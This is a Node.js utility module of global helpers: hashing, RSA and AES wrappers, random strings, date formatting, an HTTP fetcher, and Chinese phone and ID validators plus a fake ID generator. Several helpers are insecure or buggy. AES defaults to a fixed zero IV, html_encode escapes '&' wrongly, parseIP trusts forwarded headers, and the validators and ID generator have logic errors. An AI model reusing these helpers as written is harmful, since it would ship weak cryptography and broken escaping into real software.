const HTTP = require('http');
HTTP.globalAgent.maxSockets = Infinity;
const FS = require('fs');
const URL = require('url');
const Async = require('async');
const ICONV = require('iconv-lite');
const Crypto = require("crypto");
const BufferHelper = require('bufferhelper');
const _ = require("lodash");
const moment = require("moment");
const msgpack = require('msgpack5')();

const uuidv4 = require("uuid/v4");
const _get = require("lodash/get");
const _set = require("lodash/set");

const dotProp = { get:_get, set:_set };
global.__defineGetter__("dotProp", function() {
    return dotProp;
});

global.__defineGetter__("uuidv4", function() {
    return uuidv4;
});

global.__defineGetter__('jsonZip', function() {
    return msgpack.encode;
});

global.__defineGetter__('jsonUnzip', function() {
    return msgpack.decode;
});

global.__defineGetter__('md5', function() {
    return function(str) {
        let buf = new Buffer(str);
        str = buf.toString("binary");

        let hash = require("crypto").createHash("md5");
        return hash.update(str).digest("hex");
    };
});

global.__defineGetter__('runAsQueue', function() {
    return require('async').waterfall;
});

global.__defineGetter__('runAsParallel', function() {
    return require('async').parallel;
});

global.__defineGetter__('isEmpty', function() {
    return _.isEmpty;
});

global.__defineGetter__('_', function() {
    return _;
});

global.__defineGetter__('moment', function() {
    return moment;
});

global.__defineGetter__('iconv', function() {
    return ICONV;
});

global.__defineGetter__('changeEncoding', function() {
    return function(src, srcEncoding, toEncoding) {
        return ICONV.decode(ICONV.encode(new Buffer(src), srcEncoding), toEncoding);
    }
});

global.__defineGetter__('cloneObject', function() {
    return function(obj) {
        return JSON.parse(JSON.stringify(obj));
    };
});

global.__defineGetter__('mergeObject', function() {
    return exports.mergeObject;
});

global.__defineGetter__('sleep', function() {
    return exports.sleep;
});

Error.create = function(code, msg) {
    msg = msg ? msg.toString() : "unknown";
    let err = new Error('code: ' + code + ', ' + msg);
    err.code = code;
    err.msg = msg;
    err.toString = function() {
        return this.message;
    };
    return err;
}

FS.mkdirp = function() {
    let mkdirp = require("mkdirp");
    mkdirp.apply(null, Array.prototype.slice.call(arguments, 0));
}

require("console-stamp")(console, "yyyy-mm-dd HH:MM:ss");

console.fail = function(code, msg, api) {
    console.error("[" + code + "] " + (api ? "API<" + api + ">" : "") + (msg ? msg.toString() : "unknown"));
}

String.prototype.fillData = function(key, value) {
    return this.replace(new RegExp("\\{" + key + "\\}", "g"), value);
}

String.prototype.hasValue = function() {
    return this != "undefined" && this != "null" && this !== "" && this.length > 0;
}

if (!Array.prototype.shuffle) {
    Array.prototype.shuffle = function() {
        for (let j, x, i = this.length; i; j = parseInt(Math.random() * i), x = this[--i], this[i] = this[j], this[j] = x);
        return this;
    };
}

exports.modules = {
    request: require('request'),
    min_request: require('min-request'),
    iconv: require('iconv-lite'),
    bufferhelper: require('bufferhelper')
};

exports.sleep = function(time) {
    return new Promise(function (resolve) {
        setTimeout(function() {
            resolve();
        }, time);
    });
}

exports.runQueueTask = function(tasks, callBack) {
    return Async.waterfall(tasks, callBack);
}

exports.runParallelTask = function(tasks, callBack) {
    return Async.parallel(tasks, callBack);
}

exports.cloneObject = function(obj) {
    return JSON.parse(JSON.stringify(obj));
}

exports.fileExistsSync = function(path) {
    try{
        FS.accessSync(path, FS.F_OK);
    } catch (err) {
        return false;
    }
    return true;
}

exports.fileExists = function(path, callBack) {
    return new Promise(function(resolve) {
        FS.access(path, FS.F_OK, function(err) {
            if (err) {
                if (callBack) return callBack(false);
                return resolve(false);
            }
            if (callBack) return callBack(true);
            return resolve(true);
        });
    });
}

exports.md5 = function(str, option) {
    option = option || {};
    if (!option.asString) {
        let buf = new Buffer(str);
        str = buf.toString("binary");
    }

    let hash = Crypto.createHash("md5");
    return hash.update(str).digest("hex");
}

exports.rsa = function(key, plain, option) {
    option = option || {};
    if (!option.asString) {
        let buf = null;
        if (plain instanceof Buffer) {
            buf = plain;
        } else {
            buf = new Buffer(plain);
        }
        plain = buf.toString("binary");
    }

    let method = option.method || 'RSA-SHA1';
    let sign = Crypto.createSign(method);
    sign.update(plain);

    if (key.indexOf("-----BEGIN") !== 0) {
        let TYPE = option.type || "RSA PRIVATE KEY";
        key = `-----BEGIN ${TYPE}-----\n${key.trim()}\n-----END ${TYPE}-----`;
    }

    return sign.sign(key, 'base64');
}

exports.rsaVerify = function(key, plain, signature, option) {
    option = option || {};
    if (!option.asString) {
        let buf = null;
        if (plain instanceof Buffer) {
            buf = plain;
        } else {
            buf = new Buffer(plain);
        }
        plain = buf.toString("binary");
    }

    let method = option.method || 'RSA-SHA1';
    let sign = Crypto.createVerify(method);
    sign.update(plain);

    if (key.indexOf("-----BEGIN") !== 0) {
        let TYPE = option.type || "PUBLIC KEY";
        key = `-----BEGIN ${TYPE}-----\n${key.trim()}\n-----END ${TYPE}-----`;
    }

    return sign.verify(key, signature, 'base64');
}

exports.aesEncode = function(plainText, key, iv, encoding) {
    iv = iv ? iv : new Buffer('0000000000000000');
    encoding = encoding ? encoding : 'utf8';
    let decodeKey = Crypto.createHash('sha256').update(key).digest();
    let cipher = Crypto.createCipheriv('aes-256-cbc', decodeKey, iv);
    let text = ICONV.encode(new Buffer(plainText), encoding);

    return cipher.update(text, 'binary', 'hex') + cipher.final('hex');
}

exports.aesDecode = function(encryptText, key, iv, encoding) {
    iv = iv ? iv : new Buffer('0000000000000000');
    encoding = encoding ? encoding : 'utf8';
    let encodeKey = Crypto.createHash('sha256').update(key).digest();
    let cipher = Crypto.createDecipheriv('aes-256-cbc', encodeKey, iv);
    let buffer = new BufferHelper();

    let part1 = cipher.update(encryptText, 'hex');
    buffer.concat(part1);
    let part2 = cipher.final();
    buffer.concat(part2);

    return ICONV.decode(buffer.toBuffer(), encoding);
}

exports.randomString = function(len) {
    let parts = [
        [ 48, 57 ], //0-9
        [ 65, 90 ], //A-Z
        [ 97, 122 ]  //a-z
    ];

    let pwd = "";
    for (let i = 0; i < len; i++)
    {
        let part = parts[Math.floor(Math.random() * parts.length)];
        //trace(part[0], part[1], Math.floor(Math.random() * (part[1] - part[0])));
        let code = part[0] + Math.floor(Math.random() * (part[1] - part[0]));
        let c = String.fromCharCode(code);
        pwd += c;
    }
    return pwd;
}

exports.randomNumber = function(len) {
    let parts = [
        [ 48, 57 ] //0-9
    ];

    let pwd = "";
    for (let i = 0; i < len; i++)
    {
        let part = parts[0];
        //trace(part[0], part[1], Math.floor(Math.random() * (part[1] - part[0])));
        let code = part[0] + Math.floor(Math.random() * (part[1] - part[0]));
        let c = String.fromCharCode(code);
        pwd += c;
    }
    return pwd;
}

exports.stringifySignParams = function(params, option) {
    option = option || {};

    if (!(params instanceof Array)) {
        let arr = [];
        _.map(params, function (val, key) {
            arr.push([ key, val ]);
        });
        params = arr;
    }

    params = _.sortBy(params, "0");

    let signSource = "";
    for (let i = 0; i < params.length; i++) {
        let key = params[i][0];
        let val = params[i][1];
        if (!String(val).hasValue()) continue;
        if (option.encode || option.encodeComponent) {
            if (typeof val === "string") {
                if (option.encodeComponent) {
                    val = encodeURIComponent(val);
                } else {
                    if (String(val).substr(0, 8).toLowerCase().indexOf("http://") === 0) {
                        val = encodeURI(val);
                    } else {
                        val = encodeURIComponent(val);
                    }
                }
            }
        }
        option.map && option.map(key, val);
        signSource += `${key}=${val}` + "&";
    }
    return signSource.substr(0, signSource.length - 1);
}

exports.getFunctionParameterName = function(func) {
    let STRIP_COMMENTS = /((\/\/.*$)|(\/\*[\s\S]*?\*\/))/mg;
    let ARGUMENT_NAMES = /([^\s,]+)/g;let fnStr = func.toString().replace(STRIP_COMMENTS, '');
    let result = fnStr.slice(fnStr.indexOf('(')+1, fnStr.indexOf(')')).match(ARGUMENT_NAMES);
    if(result === null)
        result = [];
    return result;
}

exports.getCookieValue = function(cookies, key) {
    if (!isNaN(Number(cookies[key]))) return cookies[key];

    let val = decodeURIComponent(cookies[key]);
    val = val.trim();
    if (val.charAt(0) == "'" && val.charAt(val.length - 1) == "'") {
        return val.substr(1, val.length - 2);
    }
    return val;
}

exports.hashMapToArray = function(map, json, loopFunc) {
    let list = [];
    for (let key in map) {
        let obj = json ? JSON.parse(map[key]) : map[key];
        list.push(obj);
        if (loopFunc != null) {
            loopFunc(obj, key, map);
        }
    }
    return list;
}

exports.sortArrayByNumber = function(arr, field, order, func) {
    if (isNaN(order)) order = 1;
    arr.sort(function(value1, value2){
        if (func) func(value1, value2);
        if(value1[field] > value2[field]){
            return order * 1;
        } else if(value1[field] < value2[field]){
            return order * -1;
        } else{
            return 0;
        }
    } );
}

exports.convertArrayToHash = function(arr, key, dataHandler) {
    let map = {};
    arr.forEach(function(obj) {
        map[obj[key]] = dataHandler != null ? dataHandler(obj) : obj;
    });
    return map;
}

exports.convertArrayToHash = function(arr, key, dataHandler) {
    let map = {};
    arr.forEach(function(obj) {
        map[obj[key]] = dataHandler != null ? dataHandler(obj) : obj;
    });
    return map;
}

exports.convertDateString = function(date, spe) {
    let y = date.getFullYear();
    let m = date.getMonth() + 1;
    let d = date.getDate();

    spe = spe ? spe : "";

    return y + spe + (m < 10 ? ("0" + m) : m) + spe + (d < 10 ? ("0" + d) : d);
}

exports.convertDateStringToTime = function(dateStr) {
    let parts = dateStr.split(" ");
    let dateArr = parts[0];
    let year;
    let month;
    let day;
    if (dateArr.indexOf("-") > 0) {
        dateArr = dateStr.split("-");
        year = dateArr[0];
        month = dateArr[1];
        day = dateArr[2];
    } else if (dateArr.indexOf("/") > 0) {
        dateArr = dateStr.split("/");
        year = dateArr[0];
        month = dateArr[1];
        day = dateArr[2];
    } else if (dateArr.indexOf(".") > 0) {
        dateArr = dateStr.split(".");
        year = dateArr[0];
        month = dateArr[1];
        day = dateArr[2];
    } else if (dateArr.indexOf("年") > 0) {
        year = dateStr.substring(0, dateStr.indexOf("年"));
        month = dateStr.substring(dateStr.indexOf("年") + 1, dateStr.indexOf("月"));
        day = dateStr.substring(dateStr.indexOf("月") + 1, dateStr.indexOf("日"));
    }

    let dt = new Date();
    dt.setYear(parseInt(year));
    dt.setMonth(parseInt(month) - 1);
    dt.setDate(parseInt(day));
    dt.setHours(0);
    dt.setMinutes(0);
    dt.setSeconds(0);
    dt.setMilliseconds(0);

    if (parts.length > 1) {
        try {
            let timeStr = parts[1];
            if (timeStr.indexOf(":") > 0) {
                let timeArr = timeStr.split(":");
                dt.setHours(parseInt(timeArr[0]));
                dt.setMinutes(parseInt(timeArr[1]));
                dt.setSeconds(timeArr.length > 2 ? parseInt(timeArr[2]) : 0);
            } else if (timeStr.indexOf("时") > 0) {
                let hh = timeStr.substring(0, timeStr.indexOf("时"));
                dt.setHours(parseInt(hh));
                if(timeStr.indexOf("分") > 0) {
                    let mm = timeStr.substring(timeStr.indexOf("时") + 1, timeStr.indexOf("分"));
                    dt.setMinutes(parseInt(mm));
                }
                if(timeStr.indexOf("秒") > 0) {
                    let ss = timeStr.substring(timeStr.indexOf("分") + 1, timeStr.indexOf("秒"));
                    dt.setSeconds(parseInt(ss));
                }
            }
        } catch (err) {
            return dt.getTime();
        }
    }
    return dt.getTime();
}

exports.convertDateTimeString = function(date, needSec, dateSpe, dateTimeSpe, timeSpe) {
    let y = date.getFullYear();
    let m = date.getMonth() + 1;
    let d = date.getDate();

    let hh = date.getHours();
    let mm = date.getMinutes();
    let ss = date.getSeconds();

    dateSpe = dateSpe ? dateSpe : "";

    dateTimeSpe = dateTimeSpe ? dateTimeSpe : "";

    timeSpe = timeSpe ? timeSpe : "";

    return y + dateSpe + (m < 10 ? ("0" + m) : m) + dateSpe + (d < 10 ? ("0" + d) : d) + dateTimeSpe + (hh < 10 ? ("0" + hh) : hh) + timeSpe + (mm < 10 ? ("0" + mm) : mm) + (needSec ? (timeSpe + (ss < 10 ? ("0" + ss) : ss)) : "");
}

exports.convertSecToTimeStr = function(val, lang, allShow) {
    let str = '';
    let min = Math.floor(val / 60);
    let sec = val - min * 60;
    if (sec > 0) {
        str = (sec >= 10 ? sec : ('0' + sec)) + (lang == 'en' ? '' : '秒');
    } else {
        str = '';
    }
    let hour = Math.floor(min / 60);
    min = min - hour * 60;
    if (min > 0 || allShow) str = (min >= 10 ? min : ('0' + min)) + (lang == 'en' ? ':' : '分') + str;
    if (hour > 0 || allShow) str = (hour >= 10 ? hour : ('0' + hour)) + (lang == 'en' ? ':' : '小时') + str;
    return str;
}

exports.convertTimeToDate = function(time, toTime, lang, noSec) {
    let date = new Date();
    date.setTime(time);
    let m = date.getMonth() + 1;
    let d = date.getDate();
    let str = lang == "en" ? date.getFullYear() + "-" + (m >= 10 ? m : ('0' + m)) + "-" + (d >= 10 ? d : ('0' + d)) : date.getFullYear() + "年" + (m >= 10 ? m : ('0' + m)) + "月" + (d >= 10 ? d : ('0' + d)) + "日";
    if (toTime) {
        str += " " + (date.getHours() < 10 ? "0" + date.getHours() : date.getHours()) + ":" + (date.getMinutes() < 10 ? "0" + date.getMinutes() : date.getMinutes());
    }
    if (toTime && !noSec) {
        str += ":" + (date.getSeconds() < 10 ? "0" + date.getSeconds() : date.getSeconds());
    }
    return str;
}

exports.getTimeHourAndMin = function(time, noSec) {
    let date = new Date();
    date.setTime(time);
    let str = (date.getHours() < 10 ? "0" + date.getHours() : date.getHours()) + ":" + (date.getMinutes() < 10 ? "0" + date.getMinutes() : date.getMinutes());
    if (!noSec) {
        str += ":" + (date.getSeconds() < 10 ? "0" + date.getSeconds() : date.getSeconds());
    }
    return str;
}

exports.changeDay = function(date, passDay) {
    let todayStart = new Date();
    todayStart.setTime(date.getTime());
    todayStart = todayStart.getTime();
    todayStart += passDay * 24 * 60 * 60 * 1000;
    let day = new Date();
    day.setTime(todayStart);
    return day;
}

exports.propertyJsonParse = function(obj, clone) {
    let temp = {};
    if (!clone) {
        temp = obj;
    }
    for (let key in obj) {
        let val = obj[key];
        if (typeof val == 'string' && (String(val).indexOf('{}') == 0 || String(val).indexOf('{"') == 0 || String(val).indexOf('[]') == 0 || String(val).indexOf('[{') == 0 || String(val).indexOf('[[') == 0)) {
            try {
                temp[key] = JSON.parse(obj[key]);
            } catch (err) {
                console.error("Utils.propertyJsonParse throw an error ==> " + err.toString());
            }
        } else if (clone) {
            temp[key] = obj[key];
        }
    }
    return temp;
}

exports.propertyJsonStringify = function(obj, clone) {
    let temp = {};
    if (!clone) {
        temp = obj;
    }
    for (let key in obj) {
        let val = obj[key];
        if (typeof val == 'object') {
            try {
                temp[key] = JSON.stringify(obj[key]);
            } catch (err) {
                console.error("Utils.propertyJsonStringify throw an error ==> " + err.toString());
            }
        } else if (clone) {
            temp[key] = obj[key];
        }
    }
    return temp;
}

exports.getFromUrl = function(url) {
    let option = typeof arguments[1] == "function" ? null : arguments[1];
    let callBack = typeof arguments[1] == "function" ? arguments[1] : arguments[2];
    if (typeof callBack != "function") callBack = null;

    if (option && option.debug) console.log("ready to request [" + url + "]...");
    if (option && option.debug) option._startTime = Date.now();
    let headers = option && option.headers ? option.headers : {};
    let urlInfo = URL.parse(url);

    let req = HTTP.get({
        hostname:urlInfo.hostname,
        port:urlInfo.port ? urlInfo.port : 80,
        path:urlInfo.path,
        headers:headers
    }, function(res){
        req.$response = res;
        req.getResponseCookie = function(key) {
            if (req.$responseCookies) {
                return req.$responseCookies[key];
            } else if (req.$response && req.$response.headers) {
                let cookies = require("cookie").parse(req.$response.headers["set-cookie"]);
                cookies = cookies || {};
                req.$responseCookies = cookies;
                return cookies[key];
            } else {
                return null;
            }
        };

        let buffer = new BufferHelper();
        res.on("data", function(data){
            if (req._isTimeout === true) {
                if (option && option.debug) console.log("ops! time out....<data>");
                return;
            }
            if (option && option.debug) console.log("request response data ==> " + data.length + " bytes");
            buffer.concat(data);
        }).on("end",function(){

            clearTimeout(req._timeoutTimer);

            if (req._isTimeout === true) {
                if (option && option.debug) console.log("ops! time out....<end>");
                return;
            }

            let buf = buffer.toBuffer();
            if (option && option.debug) {
                option._costTime = Date.now() - option._startTime;
                console.log("request end ==> " + buf.length + " bytes     " + option._costTime + "ms");
            }

            //let buf = new Buffer(html,'binary');
            let str = ICONV.decode(buf, (option && option.encoding) ? option.encoding : "utf8");
            callBack(str);
        }).on("close",function(){
            callBack(null, new Error("request connection has been closed."));
        });
    });
    req.on('error',function(err){
        callBack(null, err);
    });
    if (option && option.timeout && option.timeout > 0) {
        req._timeoutTimer = setTimeout(function() {
            req._isTimeout = true;
            clearTimeout(req._timeoutTimer);
            if (option.debug) console.log("request timeout (" + option.timeout + "s).");
            callBack(null, new Error("request timeout."));
        }, option.timeout * 1000);
    }
    return req;
}

exports.dec2hex = function(i) {
    let result = "0000";
    if      (i >= 0    && i <= 15)    { result = "000" + i.toString(16); }
    else if (i >= 16   && i <= 255)   { result = "00"  + i.toString(16); }
    else if (i >= 256  && i <= 4095)  { result = "0"   + i.toString(16); }
    else if (i >= 4096 && i <= 65535) { result =         i.toString(16); }
    return result
}

exports.mergeObject = function(obj1, obj2, needClone) {
    if (!obj1) return needClone ? cloneObject(obj2) : obj2;
    if (!obj2) return needClone ? cloneObject(obj1) : obj1;
    if (needClone) {
        obj1 = cloneObject(obj1);
        obj2 = cloneObject(obj2);
    }
    for (let key in obj2) {
        obj1[key] = obj2[key];
    }
    return obj1;
}

exports.html_encode = function(str) {
    let s = "";
    if (str.length === 0) return "";
    s = str.replace(/&/img, "&gt;");
    s = s.replace(/</img, "&lt;");
    s = s.replace(/>/img, "&gt;");
    s = s.replace(/ /img, "&nbsp;");
    s = s.replace(/\'im/g, "&#39;");
    s = s.replace(/\"/img, "&quot;");
    s = s.replace(/\n/img, "<br>");
    s = s.replace(/“/img, "&ldquo;");
    s = s.replace(/”/img, "&rdquo;");
    return s;
}

exports.html_decode = function(str) {
    let s = "";
    if (str.length === 0) return "";
    s = str.replace(/&gt;/img, "&");
    s = s.replace(/&lt;/img, "<");
    s = s.replace(/&gt;/img, ">");
    s = s.replace(/&nbsp;/img, " ");
    s = s.replace(/&#39;/img, "\'");
    s = s.replace(/&quot;/img, "\"");
    s = s.replace(/<br>/img, "\n");
    s = s.replace(/&ldquo;/img, "“");
    s = s.replace(/&rdquo;/img, "”");
    return s;
}

exports.fetchFirstOneFromHash = function(hash) {
    if (!hash) return null;
    for (let prop in hash) {
        return hash[prop];
    }
}

exports.parseIP = function (req) {
    try {
        let ip = req.headers['X-Real-IP'] ||
            req.headers['X-Forwarded-For'] ||
            req.headers['x-forwarded-for'] ||
            req.connection.remoteAddress ||
            req.socket.remoteAddress ||
            req.connection.socket.remoteAddress;
        if (ip === "::1" || ip === "127.0.0.1") ip = "0.0.0.0";
        return ip;
    } catch (err) {
        return "unknown"
    }
}

let TIME_RECORD = {};

exports.startRecordTime = function(id) {
    TIME_RECORD[id] = Date.now();
}

exports.getCostTime = function(id) {
    let time = Date.now() - TIME_RECORD[id];
    delete TIME_RECORD[id];
    return time;
}

/***
 * 各种服务端验证
 * modify by YDY 2015/9/30
 ***/

//验证邮箱地址
exports.checkEmailFormat = function(str){
    if (!str || typeof str !== 'string') return false;
    let re = /^(\w-*\.*)+@(\w-?)+(\.\w{2,})+$/;
    return re.test(str);
}

//验证电话号码，手机或座机
exports.checkPhoneFormat = function(str){
    if (!str || typeof str !== 'string') return false;
    let re = /^1\d{10}$/;
    if (!re.test(str)) {
        re = /^0\d{2,3}-?\d{7,8}$/;
        return re.test(str);
    } else {
        return true;
    }
}

//验证大陆手机号码
exports.cnCellPhoneCheck = function(str){
    if (!str || typeof str !== 'string') return false;
    let re = /^1\d{10}$/;
    if(str.indexOf(",") != -1){
        let p = str.split(",");
        p.forEach(function(v){
           if(!re.test(v)){
               return false;
           }
        });
        return true;
    }else{
        if (!str || str === "" || str === "undefined" || str === "null") return false;
        return re.test(str);
    }
}

///////////////////////////////////////////////////////////////////////////

exports.idCardCheck = function (arrIdCard){
    if (!arrIdCard || typeof arrIdCard !== 'string') return false;
    let tag = false;
    let sigma = 0;
    let a = new Array(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2 );
    let w = new Array("1", "0", "X", "9", "8", "7", "6", "5", "4", "3", "2");
    for (let i = 0; i < 17; i++) {
        let ai = parseInt(arrIdCard.substring(i, i + 1));
        let wi = a[i];
        sigma += ai * wi;
    }
    let number = sigma % 11;
    let check_number = w[number];
    if (arrIdCard.substring(17) !== check_number) {
        tag =  false;
    } else {
        tag = true;
    }
    return tag;
}

exports.urlCheck = function (str){
    if (!str || typeof str !== 'string') return false;

    let reg = new RegExp("(http://){0,1}([0-9a-zA-z].+\.).+[a-zA-z].+/{0,1}");
    let isurl = reg.test(str);
    return isurl;
}

exports.lookUpProperty = function(obj, prop) {
    if (obj == null || obj === undefined || prop === null || prop === undefined) return null;
    if (prop.indexOf(".") <= 0) return obj[prop];

    let keys = prop.split(".");
    let val = obj;
    for (let i = 0; i < keys.length; i++) {
        val = val[keys[i]];
        if (val == null || val === undefined) return null;
    }
    return val;
}

exports.setProperty = function(obj, prop, val) {
    if (prop == null || prop === undefined) return obj;
    obj = obj ? obj : {};
    if (prop.indexOf(".") < 0) {
        obj[prop] = val;
        return obj;
    }

    let keys = prop.split(".");
    let temp = obj;
    for (let i = 0; i < keys.length; i++) {
        if (i === keys.length - 1) {
            temp[keys[i]] = val;
        } else {
            if (!temp[keys[i]]) {
                temp[keys[i]] = {};
            }
            temp = temp[keys[i]];
        }
    }
    return obj;
}

exports.deepClone = function(obj) {
    if (!obj) return obj;
    let copy = {};
    for (let prop in obj) {
        exports.setProperty(copy, prop, obj[prop]);
    }
    return copy;
}

exports.isFromMobile = function() {
    try {
        let userAgent = arguments[0];
        if (typeof userAgent === 'object') {
            userAgent = userAgent.headers['user-agent']
        }
        let u = userAgent.toLowerCase();
        let mobile = u.indexOf('mobile') > -1;
        let wp = u.indexOf('iemobile') > -1; //是否为windows phone
        let android = u.indexOf('android') > -1; //android终端
        let iPhone = u.indexOf('iphone') > -1; //是否为iPhone
        let iPad = u.indexOf('ipad') > -1; //是否iPad
        return mobile || wp || android || iPhone || iPad;
    } catch (err) {
        return false;
    }
}

exports.isFromAndroid = function() {
    try {
        let userAgent = arguments[0];
        if (typeof userAgent === 'object') {
            userAgent = userAgent.headers['user-agent']
        }
        let u = userAgent.toLowerCase();
        let mobile = u.indexOf('mobile') > -1;
        let android = u.indexOf('android') > -1; //android终端
        return mobile && android;
    } catch (err) {
        return false;
    }
}

exports.isFromIOS = function() {
    try {
        let userAgent = arguments[0];
        if (typeof userAgent === 'object') {
            userAgent = userAgent.headers['user-agent']
        }
        let u = userAgent.toLowerCase();
        let iPhone = u.indexOf('iphone') > -1; //是否为iPhone
        let iPad = u.indexOf('ipad') > -1; //是否iPad
        return iPhone || iPad;
    } catch (err) {
        return false;
    }
}

exports.randomCellPhone = function(sed){
    let phoneNumber = sed || "130";
    for (let i=0;i<8;i++) phoneNumber += parseInt(Math.random() * 10);
    return phoneNumber;
}

exports.createIdCard = function (){
    let id_number;
    let sigma = 0;
    let a = new Array(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2 );
    let w = new Array("1", "0", "X", "9", "8", "7", "6", "5", "4", "3", "2");

    do{
        id_number = "";
        for (let i = 0; i < 17; i++) {
            let ele = a[parseInt(Math.random()*10)];
            id_number += ele;
            let ai = parseInt(ele);
            let wi = a[i];
            sigma += ai * wi;
        }
        let number = sigma % 11;
        let check_number = w[number];
        id_number += check_number;

        let check = exports.idCardCheck(id_number);
    }while( !check );

    return id_number;
}

function deg2rad(deg) {
    return deg * (Math.PI / 180);
}

exports.calDistanceInMeters = function(p1, p2) {
    p1 = arguments.length === 2 ? arguments[0] : [ arguments[0], arguments[1] ];
    p2 = arguments.length === 2 ? arguments[1] : [ arguments[2], arguments[3] ];

    let x1 = p1[0];
    let y1 = p1[1];
    let x2 = p2[0];
    let y2 = p2[1];

    let R = 6371; // Radius of the earth in km
    let dLat = deg2rad(x2 - x1);     // deg2rad below
    let dLon = deg2rad(y2 - y1);
    let a =
        Math.sin(dLat / 2) * Math.sin(dLat / 2) +
        Math.cos(deg2rad(x1)) * Math.cos(deg2rad(x2)) *
        Math.sin(dLon / 2) * Math.sin(dLon / 2);
    let c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    let d = R * c; // Distance in km
    return Math.floor(d * 1000);
}
